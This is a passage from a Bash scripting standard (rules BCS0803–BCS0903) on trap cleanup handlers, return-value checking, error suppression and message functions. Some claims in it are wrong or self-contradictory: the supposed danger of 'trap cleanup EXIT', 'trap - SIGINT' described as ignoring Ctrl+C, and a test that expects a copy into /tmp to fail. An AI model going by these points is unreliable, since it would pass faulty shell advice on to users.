  ((bg_pid > 0)) && kill "$bg_pid" 2>/dev/null

  # Remove temp directory
  if [[ -n "$temp_dir" && -d "$temp_dir" ]]; then
    rm -rf "$temp_dir" || warn "Failed to remove temp directory: $temp_dir"
  fi

  # Remove lockfile
  if [[ -n "$lockfile" && -f "$lockfile" ]]; then
    rm -f "$lockfile" || warn "Failed to remove lockfile: $lockfile"
  fi

  # Log exit
  if ((exitcode == 0)); then
    info 'Script completed successfully'
  else
    error "Script exited with error code: $exitcode"
  fi

  exit "$exitcode"
}

# Install trap EARLY (before creating resources)
trap 'cleanup $?' SIGINT SIGTERM EXIT

# Create resources
temp_dir=$(mktemp -d)
lockfile="/var/lock/myapp-$$.lock"
echo $$ > "$lockfile"

# Start background job
monitor_process &
bg_pid=$!

# Main script logic
main "$@"

# cleanup() called automatically on exit
\`\`\`

**Multiple trap handlers (bash 3.2+):**
\`\`\`bash
# Can combine multiple traps for same signal
trap 'echo "Exiting..."' EXIT
trap 'rm -f "$temp_file"' EXIT  # ✗ This REPLACES the previous trap!

# ✓ Correct - combine in one trap
trap 'echo "Exiting..."; rm -f "$temp_file"' EXIT

# ✓ Or use a cleanup function
trap 'cleanup' EXIT
\`\`\`

**Trap execution order:**
\`\`\`bash
# Traps execute in order: specific signal, then EXIT
trap 'echo "SIGINT handler"' SIGINT
trap 'echo "EXIT handler"' EXIT

# On Ctrl+C:
# 1. SIGINT handler runs
# 2. EXIT handler runs
# 3. Script exits
\`\`\`

**Disabling traps:**
\`\`\`bash
# Disable specific trap
trap - EXIT
trap - SIGINT SIGTERM

# Disable trap during critical section
trap - SIGINT  # Ignore Ctrl+C during critical operation
perform_critical_operation
trap 'cleanup $?' SIGINT  # Re-enable
\`\`\`

**Trap gotchas and best practices:**

**1. Trap recursion prevention:**
\`\`\`bash
cleanup() {
  # ✓ CRITICAL: Disable trap first to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # If cleanup fails, trap won't trigger again
  rm -rf "$temp_dir"  # If this fails...
  exit "$exitcode"    # ...we still exit cleanly
}
\`\`\`

**2. Preserve exit code:**
\`\`\`bash
# ✓ Correct - capture $? immediately
trap 'cleanup $?' EXIT

# ✗ Wrong - $? may change between trigger and handler
trap 'cleanup' EXIT  # $? inside cleanup may be different
\`\`\`

**3. Quote trap commands:**
\`\`\`bash
# ✓ Correct - single quotes prevent early expansion
trap 'rm -f "$temp_file"' EXIT

# ✗ Wrong - double quotes expand variables now, not on trap
temp_file="/tmp/foo"
trap "rm -f $temp_file" EXIT  # Expands to: trap 'rm -f /tmp/foo' EXIT
temp_file="/tmp/bar"  # Trap still removes /tmp/foo!
\`\`\`

**4. Set trap early:**
\`\`\`bash
# ✓ Correct - set trap BEFORE creating resources
trap 'cleanup $?' EXIT
temp_file=$(mktemp)

# ✗ Wrong - resource created before trap installed
temp_file=$(mktemp)
trap 'cleanup $?' EXIT  # If script exits between these lines, temp_file leaks!
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - not preserving exit code
trap 'rm -f "$temp_file"; exit 0' EXIT  # Always exits with 0!

# ✓ Correct - preserve exit code
trap 'exitcode=$?; rm -f "$temp_file"; exit $exitcode' EXIT

# ✗ Wrong - using function without ()
trap cleanup EXIT  # Tries to run command named "cleanup"

# ✓ Correct - use function call syntax
trap 'cleanup $?' EXIT

# ✗ Wrong - complex cleanup logic inline
trap 'rm "$file1"; rm "$file2"; kill $pid; rm -rf "$dir"' EXIT

# ✓ Correct - use cleanup function
cleanup() {
  rm -f "$file1" "$file2"
  kill "$pid" 2>/dev/null
  rm -rf "$dir"
}
trap 'cleanup' EXIT
\`\`\`

**Testing trap handlers:**

\`\`\`bash
#!/usr/bin/env bash
set -euo pipefail

cleanup() {
  echo "Cleanup called with exit code: ${1:-?}"
  trap - EXIT
  exit "${1:-0}"
}

trap 'cleanup $?' EXIT

echo "Normal operation..."
# Test Ctrl+C: press Ctrl+C -> cleanup called
# Test error: false -> cleanup called with exit code 1
# Test normal: script ends -> cleanup called with exit code 0
\`\`\`

**Summary:**
- **Always use cleanup function** for non-trivial cleanup
- **Disable trap inside cleanup** to prevent recursion
- **Set trap early** before creating resources
- **Preserve exit code** with `trap 'cleanup $?' EXIT`
- **Use single quotes** to delay variable expansion
- **Test thoroughly** with normal exit, errors, and signals


---


**Rule: BCS0804**

### Checking Return Values

**Always check return values of commands and function calls, providing informative error messages that include context about what failed. While `set -e` helps, explicit checking gives better control over error handling and messaging.**

**Rationale:**

- **Better Error Messages**: Explicit checks allow contextual error messages showing what operation failed
- **Controlled Recovery**: Some failures should trigger cleanup or fallback logic, not immediate exit
- **`set -e` Limitations**: `set -e` doesn't catch all failures (pipelines, command substitution, conditions)
- **Debugging Aid**: Explicit checks make it obvious which command failed
- **Partial Failure Handling**: Some operations can continue after non-critical failures
- **User Experience**: Informative errors help users understand what went wrong and how to fix it

**When `set -e` is not enough:**

\`\`\`bash
# set -e doesn't catch these failures:

# 1. Commands in pipelines (except last)
cat missing_file.txt | grep pattern  # Doesn't exit if cat fails!

# 2. Commands in conditionals
if command_that_fails; then
  echo "This runs even though command failed"
fi

# 3. Commands with || (already handled)
failing_command || echo "Failed but continuing"

# 4. Command substitution in assignments
output=$(failing_command)  # Doesn't exit!
echo "$output"  # Empty, but script continues

# 5. Functions with explicit return
my_function() {
  return 1
}
my_function  # Exits with set -e
# But if used in conditional, doesn't exit:
if my_function; then
  echo "Never reached"
fi
\`\`\`

**Basic return value checking patterns:**

**Pattern 1: Explicit if check (most informative)**

\`\`\`bash
# ✓ Best for critical operations needing context
if ! mv "$source_file" "$dest_dir/"; then
  error "Failed to move $source_file to $dest_dir"
  error "Check permissions and disk space"
  exit 1
fi
\`\`\`

**Pattern 2: || with die (concise)**

\`\`\`bash
# ✓ Good for simple cases with one-line error
mv "$source_file" "$dest_dir/" || die 1 "Failed to move $source_file"

# ✓ Can include variable context
cp "$config" "$backup" || die 1 "Failed to backup $config to $backup"
\`\`\`

**Pattern 3: || with command group (for cleanup)**

\`\`\`bash
# ✓ Good when failure requires cleanup
mv "$temp_file" "$final_location" || {
  error "Failed to move $temp_file to $final_location"
  rm -f "$temp_file"
  exit 1
}

# ✓ Multiple cleanup steps
process_file "$input" || {
  error "Processing failed: $input"
  restore_backup
  cleanup_temp_files
  return 1
}
\`\`\`

**Pattern 4: Capture and check return code**

\`\`\`bash
# ✓ When you need the return code value
local -i exit_code
command_that_might_fail
exit_code=$?

if ((exit_code != 0)); then
  error "Command failed with exit code $exit_code"
  return "$exit_code"
fi

# ✓ Different actions for different exit codes
wget "$url"
case $? in
  0) success "Download complete" ;;
  1) die 1 "Generic error" ;;
  2) die 2 "Parse error" ;;
  3) die 3 "File I/O error" ;;
  4) die 4 "Network failure" ;;
  *) die 1 "Unknown error code: $?" ;;
esac
\`\`\`

**Pattern 5: Function return value checking**

\`\`\`bash
# Define function with meaningful return codes
validate_file() {
  local -- file="$1"

  [[ -f "$file" ]] || return 2  # Not found
  [[ -r "$file" ]] || return 5  # Permission denied
  [[ -s "$file" ]] || return 22  # Invalid (empty)

  return 0  # Success
}

# Check function return value
if validate_file "$config_file"; then
  source "$config_file"
else
  case $? in
    2)  die 2 "Config file not found: $config_file" ;;
    5)  die 5 "Cannot read config file: $config_file" ;;
    22) die 22 "Config file is empty: $config_file" ;;
    *)  die 1 "Config validation failed: $config_file" ;;
  esac
fi
\`\`\`

**Edge case: Pipelines**

\`\`\`bash
# Problem: set -e only checks last command in pipeline
cat missing_file | grep pattern  # Continues even if cat fails!

# ✓ Solution 1: Use PIPEFAIL (from set -euo pipefail)
set -o pipefail  # Now entire pipeline fails if any command fails
cat missing_file | grep pattern  # Exits if cat fails

# ✓ Solution 2: Check PIPESTATUS array
cat file1 | grep pattern | sort
if ((PIPESTATUS[0] != 0)); then
  die 1 "cat failed"
elif ((PIPESTATUS[1] != 0)); then
  info "No matches found (grep returned non-zero)"
elif ((PIPESTATUS[2] != 0)); then
  die 1 "sort failed"
fi

# ✓ Solution 3: Avoid pipeline, use process substitution
grep pattern < <(cat file1)
\`\`\`

**Edge case: Command substitution**

\`\`\`bash
# Problem: Command substitution failure not caught
declare -- output
output=$(failing_command)  # Doesn't exit even with set -e!
echo "Output: $output"  # Empty

# ✓ Solution 1: Check after assignment
output=$(command_that_might_fail) || die 1 "Command failed"

# ✓ Solution 2: Explicit check in separate step
declare -- result
if ! result=$(complex_command arg1 arg2); then
  die 1 "complex_command failed"
fi

# ✓ Solution 3: Use set -e with inherit_errexit (Bash 4.4+)
shopt -s inherit_errexit  # Command substitution inherits set -e
output=$(failing_command)  # NOW exits with set -e
\`\`\`

**Edge case: Conditional contexts**

\`\`\`bash
# Commands in if/while/until don't trigger set -e

# Problem: This doesn't exit even with set -e
if some_command; then
  echo "Command succeeded"
else
  echo "Command failed but script continues"
fi

# ✓ Solution: Explicit check after conditional
if some_command; then
  process_result
else
  die 1 "some_command failed"
fi

# Or check return code
some_command
if (($? != 0)); then
  die 1 "some_command failed"
fi
\`\`\`

**Complete example with comprehensive error checking:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Messaging functions
error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*"
}

die() {
  local -i exit_code=$1
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

info() {
  echo "[$SCRIPT_NAME] $*"
}

# Validate prerequisites
check_prerequisites() {
  local -- cmd
  local -a required_commands=('tar' 'gzip' 'sha256sum')

  info 'Checking prerequisites...'

  for cmd in "${required_commands[@]}"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      die 1 "Required command not found: $cmd"
    fi
  done

  info 'Prerequisites check passed'
}

# Create backup with error checking
create_backup() {
  local -- source_dir="$1"
  local -- backup_file="$2"
  local -- temp_file
  local -i exit_code

  info "Creating backup: $source_dir -> $backup_file"

  # Check source exists
  if [[ ! -d "$source_dir" ]]; then
    error "Source directory not found: $source_dir"
    return 2
  fi

  # Check destination writable
  if [[ ! -w "${backup_file%/*}" ]]; then
    error "Cannot write to directory: ${backup_file%/*}"
    return 5
  fi

  # Create backup with error handling
  temp_file="${backup_file}.tmp"

  # Create tar archive
  if ! tar -czf "$temp_file" -C "${source_dir%/*}" "${source_dir##*/}"; then
    error "Failed to create tar archive"
    rm -f "$temp_file"
    return 1
  fi

  # Verify archive
  if ! tar -tzf "$temp_file" >/dev/null; then
    error "Backup verification failed"
    rm -f "$temp_file"
    return 1
  fi

  # Move to final location
  if ! mv "$temp_file" "$backup_file"; then
    error "Failed to move backup to final location"
    rm -f "$temp_file"
    return 1
  fi

  # Create checksum
  if ! sha256sum "$backup_file" > "${backup_file}.sha256"; then
    error "Failed to create checksum"
    # Non-fatal - backup is still valid
    return 0
  fi

  info "Backup created successfully: $backup_file"
  return 0
}

# Process multiple files with return value checking
process_files() {
  local -a files=("$@")
  local -- file
  local -i success_count=0
  local -i fail_count=0

  for file in "${files[@]}"; do
    if create_backup "$file" "/backup/${file##*/}.tar.gz"; then
      ((success_count+=1))
      info "Success: $file"
    else
      ((fail_count+=1))
      error "Failed: $file (return code: $?)"
    fi
  done

  info "Results: $success_count successful, $fail_count failed"

  # Return non-zero if any failures
  ((fail_count == 0))
}

main() {
  check_prerequisites

  local -a source_dirs=('/etc' '/var/log')

  if ! process_files "${source_dirs[@]}"; then
    die 1 "Some backups failed"
  fi

  info "All backups completed successfully"
}

main "$@"

#fin
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - ignoring return values
mv "$file" "$dest"
# No check! If mv fails, script continues

# ✓ Correct - check return value
mv "$file" "$dest" || die 1 "Failed to move $file to $dest"

# ✗ Wrong - checking $? too late
command1
command2
if (($? != 0)); then  # Checks command2, not command1!

# ✓ Correct - check immediately
command1
if (($? != 0)); then
  die 1 "command1 failed"
fi
command2

# ✗ Wrong - generic error message
mv "$file" "$dest" || die 1 "Move failed"
# User has no idea what file or where!

# ✓ Correct - specific error message
mv "$file" "$dest" || die 1 "Failed to move $file to $dest"

# ✗ Wrong - not checking command substitution
checksum=$(sha256sum "$file")
# If sha256sum fails, checksum is empty but script continues!

# ✓ Correct - check command substitution
checksum=$(sha256sum "$file") || die 1 "Failed to compute checksum for $file"

# ✗ Wrong - not cleaning up after failure
cp "$source" "$dest" || exit 1
# Might leave partial file at $dest!

# ✓ Correct - cleanup on failure
cp "$source" "$dest" || {
  rm -f "$dest"
  die 1 "Failed to copy $source to $dest"
}

# ✗ Wrong - assuming set -e catches everything
set -e
output=$(failing_command)  # Doesn't exit!
cat missing_file | grep pattern  # Doesn't exit if cat fails!

# ✓ Correct - explicit checks even with set -e
set -euo pipefail
shopt -s inherit_errexit
output=$(failing_command) || die 1 "Command failed"
cat file | grep pattern  # Now exits if cat fails (pipefail)
\`\`\`

**Testing return value handling:**

\`\`\`bash
# Test function return values
test_function_returns() {
  # Should return 0 for valid input
  validate_file "existing_file.txt"
  local -i result=$?
  ((result == 0)) || die 1 "Expected return 0, got $result"

  # Should return 2 for missing file
  validate_file "missing_file.txt"
  result=$?
  ((result == 2)) || die 1 "Expected return 2, got $result"

  info "Return value tests passed"
}

# Test error handling
test_error_handling() {
  # Should exit with error on failure
  if failing_operation; then
    die 1 "Expected failure but succeeded"
  fi

  info "Error handling tests passed"
}
\`\`\`

**Summary:**

- **Always check return values** of critical operations
- **Use `set -euo pipefail`** as baseline, but add explicit checks for control
- **Provide context** in error messages (what failed, with what inputs)
- **Check command substitution** results: `output=$(cmd) || die 1 "cmd failed"`
- **Use PIPEFAIL** to catch pipeline failures
- **Handle different exit codes** appropriately (0=success, 1=general error, 2=usage, etc.)
- **Clean up on failure** using `|| { cleanup; exit 1; }` pattern
- **Test error paths** to ensure failures are caught

**Key principle:** Defensive programming means assuming operations can fail. Check return values, provide informative errors, and handle failures gracefully. The extra lines of error checking prevent hours of debugging mysterious failures.


---


**Rule: BCS0805**

### Error Suppression

**Only suppress errors when the failure is expected, non-critical, and you have explicitly decided it's safe to continue. Always document WHY errors are being suppressed. Indiscriminate error suppression masks bugs and creates unreliable scripts.**

**Rationale:**

- **Masks Real Bugs**: Suppressing errors hides failures that should be fixed
- **Silent Failures**: Scripts appear to succeed while actually failing
- **Security Risk**: Ignored errors can leave systems in insecure states
- **Debugging Nightmare**: Suppressed errors make it impossible to diagnose problems
- **False Success**: Users think operation succeeded when it actually failed
- **Technical Debt**: Suppressed errors often indicate design problems that should be fixed

**When error suppression IS appropriate:**

**1. Checking if command exists (expected to fail):**

\`\`\`bash
# ✓ Appropriate - failure is expected and non-critical
if command -v optional_tool >/dev/null 2>&1; then
  info 'optional_tool available'
else
  info 'optional_tool not found (optional)'
fi
\`\`\`

**2. Checking if file exists (expected to fail):**

\`\`\`bash
# ✓ Appropriate - testing existence, failure is expected
if [[ -f "$optional_config" ]]; then
  source "$optional_config"
else
  info "Using default configuration (no $optional_config)"
fi
\`\`\`

**3. Cleanup operations (may fail if nothing to clean):**

\`\`\`bash
# ✓ Appropriate - cleanup may have nothing to do
cleanup_temp_files() {
  # Suppress errors - temp files might not exist
  rm -f /tmp/myapp_* 2>/dev/null || true
  rmdir /tmp/myapp 2>/dev/null || true
}
\`\`\`

**4. Optional operations with fallback:**

\`\`\`bash
# ✓ Appropriate - md2ansi is optional, have fallback
if command -v md2ansi >/dev/null 2>&1; then
  md2ansi < "$file" || cat "$file"  # Fallback to cat
else
  cat "$file"  # md2ansi not available
fi
\`\`\`

**5. Idempotent operations:**

\`\`\`bash
# ✓ Appropriate - directory may already exist
install -d "$target_dir" 2>/dev/null || true

# ✓ Appropriate - user may already exist
id "$username" >/dev/null 2>&1 || useradd "$username"
\`\`\`

**When error suppression is DANGEROUS:**

**1. File operations (usually critical):**

\`\`\`bash
# ✗ DANGEROUS - if copy fails, script continues with missing file!
cp "$important_config" "$destination" 2>/dev/null || true

# ✓ Correct - check result and fail explicitly
if ! cp "$important_config" "$destination"; then
  die 1 "Failed to copy config to $destination"
fi
\`\`\`

**2. Data processing (silently loses data):**

\`\`\`bash
# ✗ DANGEROUS - if processing fails, data is lost!
process_data < input.txt > output.txt 2>/dev/null || true

# ✓ Correct - check result
if ! process_data < input.txt > output.txt; then
  die 1 'Data processing failed'
fi
\`\`\`

**3. System configuration (leaves system broken):**

\`\`\`bash
# ✗ DANGEROUS - if systemctl fails, service is not running!
systemctl start myapp 2>/dev/null || true

# ✓ Correct - verify service started
systemctl start myapp || die 1 'Failed to start myapp service'
\`\`\`

**4. Security operations (creates vulnerabilities):**

\`\`\`bash
# ✗ DANGEROUS - if chmod fails, file has wrong permissions!
chmod 600 "$private_key" 2>/dev/null || true

# ✓ Correct - security operations must succeed
chmod 600 "$private_key" || die 1 "Failed to secure $private_key"
\`\`\`

**5. Dependency checks (script runs without required tools):**

\`\`\`bash
# ✗ DANGEROUS - if git is missing, later commands will fail mysteriously!
command -v git >/dev/null 2>&1 || true

# ✓ Correct - fail early if dependency missing
command -v git >/dev/null 2>&1 || die 1 'git is required'
\`\`\`

**Error suppression patterns:**

**Pattern 1: Redirect stderr to /dev/null**

\`\`\`bash
# Suppress only error messages
command 2>/dev/null

# Use when: Error messages are noisy but you still check return value
if ! command 2>/dev/null; then
  error "command failed"
fi
\`\`\`

**Pattern 2: || true (ignore return code)**

\`\`\`bash
# Make command always succeed
command || true

# Use when: Failure is acceptable and you want to continue
rm -f /tmp/optional_file || true
\`\`\`

**Pattern 3: Combined suppression**

\`\`\`bash
# Suppress both errors and return code
command 2>/dev/null || true

# Use when: Both error messages and return code are irrelevant
rmdir /tmp/maybe_exists 2>/dev/null || true
\`\`\`

**Pattern 4: Suppress with comment (ALWAYS document WHY)**

\`\`\`bash
# Suppress errors for optional cleanup
# Rationale: Temp files may not exist, this is not an error
rm -f /tmp/myapp_* 2>/dev/null || true

# Suppress errors for idempotent operation
# Rationale: Directory may already exist from previous run
install -d "$cache_dir" 2>/dev/null || true
\`\`\`

**Pattern 5: Conditional suppression**

\`\`\`bash
# Only suppress in specific cases
if ((DRY_RUN)); then
  # In dry-run, operations are expected to fail
  actual_operation 2>/dev/null || true
else
  # In real mode, operations must succeed
  actual_operation || die 1 'Operation failed'
fi
\`\`\`

**Complete example with appropriate suppression:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -- CACHE_DIR="$HOME/.cache/myapp"
declare -- LOG_FILE="$HOME/.local/share/myapp/app.log"

# Check for optional dependency (suppress is OK)
check_optional_tools() {
  # ✓ Safe to suppress - tool is optional
  if command -v md2ansi >/dev/null 2>&1; then
    info 'md2ansi available for formatted output'
    declare -g -i HAS_MD2ANSI=1
  else
    info 'md2ansi not found (optional)'
    declare -g -i HAS_MD2ANSI=0
  fi
}

# Check required dependency (DO NOT suppress)
check_required_tools() {
  # ✗ Do NOT suppress - tool is required
  if ! command -v jq >/dev/null 2>&1; then
    die 1 'jq is required but not found'
  fi
  info 'Required tools found'
}

# Create directories (suppress is OK for idempotent operation)
create_directories() {
  # ✓ Safe to suppress - directory may already exist
  # Rationale: install -d is idempotent, existing directory is not an error
  install -d "$CACHE_DIR" 2>/dev/null || true
  install -d "${LOG_FILE%/*}" 2>/dev/null || true

  # But verify they exist now
  [[ -d "$CACHE_DIR" ]] || die 1 "Failed to create cache directory: $CACHE_DIR"
  [[ -d "${LOG_FILE%/*}" ]] || die 1 "Failed to create log directory: ${LOG_FILE%/*}"
}

# Cleanup old files (suppress is OK)
cleanup_old_files() {
  info 'Cleaning up old files...'

  # ✓ Safe to suppress - files may not exist
  # Rationale: Cleanup is best-effort, missing files are not an error
  rm -f "$CACHE_DIR"/*.tmp 2>/dev/null || true
  rm -f "$CACHE_DIR"/*.old 2>/dev/null || true

  # ✓ Safe to suppress - directory may be empty or not exist
  # Rationale: rmdir only removes empty directories, failure is expected
  rmdir "$CACHE_DIR"/temp_* 2>/dev/null || true

  info 'Cleanup complete'
}

# Process data (DO NOT suppress)
process_data() {
  local -- input_file="$1"
  local -- output_file="$2"

  # ✗ Do NOT suppress - data processing errors are critical
  if ! jq '.data' < "$input_file" > "$output_file"; then
    die 1 "Failed to process $input_file"
  fi

  # ✗ Do NOT suppress - validation must succeed
  if ! jq empty < "$output_file"; then
    die 1 "Output file is invalid: $output_file"
  fi

  info "Processed: $input_file -> $output_file"
}

main() {
  check_required_tools
  check_optional_tools
  create_directories
  cleanup_old_files

  # Process files (errors NOT suppressed)
  process_data 'input.json' "$CACHE_DIR/output.json"

  info 'Processing complete'
}

main "$@"

#fin
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ WRONG - suppressing critical operation
cp "$important_file" "$backup" 2>/dev/null || true
# If cp fails, you have no backup but script continues!

# ✓ Correct - check critical operations
cp "$important_file" "$backup" || die 1 "Failed to create backup"

# ✗ WRONG - suppressing without understanding why
some_command 2>/dev/null || true
# Why are we suppressing? Is this safe?

# ✓ Correct - document reason for suppression
# Suppress errors: temp directory may not exist (non-critical)
rmdir /tmp/myapp 2>/dev/null || true

# ✗ WRONG - suppressing all errors in function
process_files() {
  # ... many operations ...
} 2>/dev/null
# This suppresses ALL errors in function - extremely dangerous!

# ✓ Correct - only suppress specific operations
process_files() {
  critical_operation || die 1 'Critical operation failed'
  optional_cleanup 2>/dev/null || true  # Only this is suppressed
}

# ✗ WRONG - using set +e to suppress errors
set +e
critical_operation
set -e
# Disables error checking for entire block!

# ✓ Correct - use || true for specific command
critical_operation || {
  error 'Operation failed but continuing'
  # Decided this is safe to ignore in this context
  true
}

# ✗ WRONG - suppressing in production but not development
if [[ "$ENV" == "production" ]]; then
  operation 2>/dev/null || true
else
  operation
fi
# If it fails in production, you need to know!

# ✓ Correct - same error handling everywhere
operation || die 1 'Operation failed'
\`\`\`

**Testing error suppression:**

\`\`\`bash
# Verify suppression is appropriate
test_error_suppression() {
  # Test that suppressed operation actually might fail
  rm -f /nonexistent/file 2>/dev/null || true

  # Verify this didn't break anything
  [[ -d /tmp ]] || die 1 'Suppressed operation broke system!'

  # Test that non-suppressed operations are checked
  if ! cp /etc/passwd /tmp/test_passwd 2>&1; then
    info 'Correctly detected failure'
  else
    die 1 'Should have failed without /tmp write permission'
  fi

  rm -f /tmp/test_passwd
}
\`\`\`

**Summary:**

- **Only suppress** when failure is expected, non-critical, and safe to ignore
- **Always document** WHY errors are suppressed (comment above suppression)
- **Never suppress** critical operations (data, security, required dependencies)
- **Use `|| true`** to ignore return code while keeping stderr visible
- **Use `2>/dev/null`** to suppress error messages while checking return code
- **Use both** (`2>/dev/null || true`) only when both messages and return code are irrelevant
- **Verify after** suppressed operations when possible
- **Test without** suppression first to ensure operation is correct

**Key principle:** Error suppression should be the exception, not the rule. Every `2>/dev/null` and `|| true` is a deliberate decision that this specific failure is safe to ignore. Document the decision with a comment explaining why.


---


**Rule: BCS0901**

### Standardized Messaging and Color Support
\`\`\`bash
# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
\`\`\`


---


**Rule: BCS0902**

### STDOUT vs STDERR
- All error messages should go to \`STDERR\`
- Place \`>&2\` at the *beginning* commands for clarity

\`\`\`bash
# Preferred format
somefunc() {
  >&2 echo "[$(date -Ins)]: $*"
}

# Also acceptable
somefunc() {
  echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
}
\`\`\`


---


**Rule: BCS0903**

### Core Message Functions

**Every script should implement a standard set of messaging functions that provide consistent, colored, contextual output. Use a private `_msg()` core function that detects the calling function via `FUNCNAME` to automatically format messages appropriately.**

**Rationale:**

- **Consistency**: Same message format across all scripts
- **Context**: `FUNCNAME` inspection automatically adds appropriate prefix/color
- **DRY Principle**: Single `_msg()` implementation reused by all messaging functions
- **Verbosity Control**: Conditional functions (`info`, `warn`) respect `VERBOSE` flag
- **Proper Streams**: Errors/warnings to stderr, regular output to stdout
- **User Experience**: Colors and symbols make output scannable
- **Debugging**: `DEBUG` flag enables detailed diagnostic output

**Core messaging function pattern:**

The pattern uses a private `_msg()` function that inspects `FUNCNAME[1]` (the calling function) to determine formatting:

\`\`\`bash
# Private core messaging function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  # Detect calling function and set appropriate prefix/color
  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;  # Other callers get plain prefix
  esac

  # Print each message argument on separate line
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}
\`\`\`

**Public wrapper functions:**

\`\`\`bash
# Conditional output functions (respect VERBOSE flag)
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug output (respects DEBUG flag)
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional error output (always shown)
error()   { >&2 _msg "$@"; }

# Error and exit
die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}
\`\`\`

**Usage examples:**

\`\`\`bash
# Information (only shown if VERBOSE=1)
info 'Starting processing...'
info "Processing $count files"

# Success (only shown if VERBOSE=1)
success 'Build completed'
success "Installed to $PREFIX"

# Warning (only shown if VERBOSE=1)
warn 'Configuration file not found, using defaults'
warn "Deprecated option: $old_option"

# Error (always shown)
error 'Failed to connect to server'
error "Invalid file: $filename"

# Debug (only shown if DEBUG=1)
debug "Variable state: count=$count, file=$file"
debug 'Entering cleanup phase'

# Exit with error message
die 1 'Critical error occurred'
die 2 "Invalid argument: $arg"
die 22 "File not found: $file"

# Exit without message (just return code)
die 1
\`\`\`

**Why stdout vs stderr matters:**

\`\`\`bash
# info/warn/error go to stderr (>&2)
# This allows:

# 1. Separating data output from messages
data=$(./script.sh)  # Gets only data, not info messages

# 2. Redirecting errors separately
./script.sh 2>errors.log  # Errors to file, data to stdout

# 3. Piping data while seeing messages
./script.sh | process_data  # Messages visible, data piped
\`\`\`

**Color definitions:**

\`\`\`bash
# Standard colors (conditional on terminal output)
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m'
  NC=$'\033[0m'  # No Color (reset)
else
  # Not a terminal - disable colors
  RED=''
  GREEN=''
  YELLOW=''
  CYAN=''
  NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC
\`\`\`

**Flag variables:**

\`\`\`bash
# Global flags controlling output
declare -i VERBOSE=0  # Set to 1 for info/warn/success messages
declare -i DEBUG=0    # Set to 1 for debug messages
declare -i PROMPT=1   # Set to 0 to disable prompts (for automation)
\`\`\`

**Complete messaging function set:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Global flags
declare -i VERBOSE=0
declare -i DEBUG=0
declare -i PROMPT=1

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m'
  NC=$'\033[0m'
else
  RED=''
  GREEN=''
  YELLOW=''
  CYAN=''
  NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC

# ============================================================================
# Messaging Functions
# ============================================================================

# Core message function using FUNCNAME for context
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

# Conditional output based on verbosity
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug output
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional error output
error()   { >&2 _msg "$@"; }

# Error and exit
die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
